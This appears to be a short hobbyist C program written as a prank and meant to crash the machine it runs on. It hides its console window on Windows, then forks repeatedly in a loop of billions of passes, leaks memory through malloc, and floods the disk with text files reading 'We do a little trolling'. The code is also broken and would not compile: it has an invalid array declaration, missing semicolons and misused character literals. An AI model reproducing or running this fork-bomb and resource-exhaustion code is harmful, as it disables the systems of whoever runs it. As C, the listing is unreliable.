#include <stdlib.h>
#include <stdio.h>
#ifdef _WIN32
    #define _WIN32_WINNT 0x0500
    #include <windows.h>
#endif

//forgive me if this is trash I am new to C
int main() {
    #ifdef _WIN32
    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_MINIMIZE );
    ShowWindow( hWnd, SW_HIDE );    
    #endif
    FILE[] *x;
    for(unsigned int i = 0; i < 4294967295; i++) {
        for(int y = 0; y < 10; y++) {
            fork()
        }
        if(i <= 1000) {
            malloc(1000);
        } else {
            malloc(i);
        }
        x[i] = fopen(rand() + '.txt', 'w+')
        for(int y = 0, y < i; y++){
            fputs("We do a little trolling\n", x[i]);
        }
    }
}
